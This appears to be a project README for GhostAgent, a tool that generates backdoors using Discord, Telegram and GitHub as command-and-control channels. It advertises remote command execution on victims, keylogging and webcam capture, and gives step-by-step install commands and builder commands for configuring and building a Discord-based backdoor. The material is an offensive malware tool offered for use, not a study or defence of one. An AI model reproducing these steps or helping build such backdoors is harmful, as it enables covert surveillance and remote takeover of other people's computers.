## What is GhostAgent?

GhostAgent is a malware generator that generates backdoors which use online platforms as C2s. This includes Discord, Telegram and Github. 

Our goal is to prove that anything can be a C2, if you want to :) ...

## How does it work?

The GhostAgent backdoors are using libraries which allow the backdoor to act as a "Bot" for the above-mentioned platforms. Essentially the attacker contacts the bot and specifies a malicious command to execute on the target "Agent". 

GhostAgent is equipped with a lot of features **some** of which are:
- Encrypted traffic (HTTPS)
- Running system commands on target Agent
- Keylogger (Limited to Discord)
- Grabbing webcam snaps
- Multiple online agents at a time (Limited to Discord & GitHub)

## Installation and Usage

GhostAgent is better installed and used on Kali Linux:
```
git clone https://github.com/3ct0s/GhostAgent-c2
cd ./GhostAgent-c2
chmod +x setup.sh
./setup.sh
```
Once this is done we can use the builder. Let's build a discord based C2 backdoor:
```
python builder.py
use discord
set name <backdoor-name>
set guild-id <server id from discord>
set bot-token <discord bot token>
set channel-id <channel id from discord server>
set webhook <discord webhook>
build
```

## How to Setup GhostAgent
Since the setup process is very specific for each platform:

> Please follow the [setup guide](https://github.com/3ct0s/GhostAgent-c2/wiki/) to setup GhostAgent.
